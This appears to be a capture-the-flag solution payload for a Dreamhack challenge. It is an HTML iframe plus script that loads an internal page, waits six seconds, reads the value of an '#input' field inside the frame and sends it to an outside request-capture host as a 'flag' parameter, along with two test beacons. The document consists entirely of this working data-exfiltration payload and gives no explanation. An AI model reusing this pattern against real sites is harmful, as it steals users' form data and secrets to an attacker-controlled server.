<iframe src="http://web:8080/index.html" onload="stealFlag()" id="target"></iframe>
<script>
  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
  function stealFlag() {
    setTimeout(() => {
      var input = document.getElementById("target").contentWindow.document.querySelector("#input");
      fetch("https://vvuipmj.request.dreamhack.games?flag=" + input.value);
    }, 6000); // 6초 후 실행
  }
  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
</script>
